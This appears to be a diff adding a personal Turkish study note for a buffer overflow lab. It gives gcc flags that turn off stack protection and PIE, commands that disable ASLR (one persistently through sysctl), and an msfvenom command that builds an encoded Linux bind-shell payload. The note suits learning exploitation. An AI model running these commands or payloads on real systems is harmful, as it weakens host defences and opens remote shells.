@@ -1,0 +1,35 @@
+﻿gcc -g fury.c -o furyb
+32 bit ve bu kod ile derle yoksa bof çalışmıyor
+gcc -g fury.c -o fury -m32 -fno-stack-protector -z execstack -no-pie
+
+ile derle -g ile gdb de kodların çıkmasını sağlıyorsun
+
+-------- rastgele bellek erişimini kapat ki bof çalışsın------
+ayrıca 
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+kodunu işin bitince kalide
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+yap
+kalıcı olarak kapatmak için
+echo "kernel.randomize_va_space = 0" > /etc/sysctl.d/01-disable-aslr.conf
+yap
+
+-------- rastgele bellek erişimini kapat ki bof çalışsın------
+
+
+
+
+
+payloadı şu komutla oluştur
+msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
+yani
+msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed lhost=192.168.1.10 lport=4444 -f python
+
+
+yararlandığım siteler
+https://www.rapidtables.com/convert/number/hex-to-ascii.html
+https://gist.github.com/LiveOverflow/5fa36bec51968de696b11d3548b02148 (nasıl derlendiği yazıyor altta)
+https://blog.programster.org/how-to-disable-aslr
+https://stackoverflow.com/questions/89603/how-does-the-debugging-option-g-change-the-binary-executable
+ve asıl olayı bu sitede
+https://samsclass.info/127/proj/p4-lbuf-shell.htm
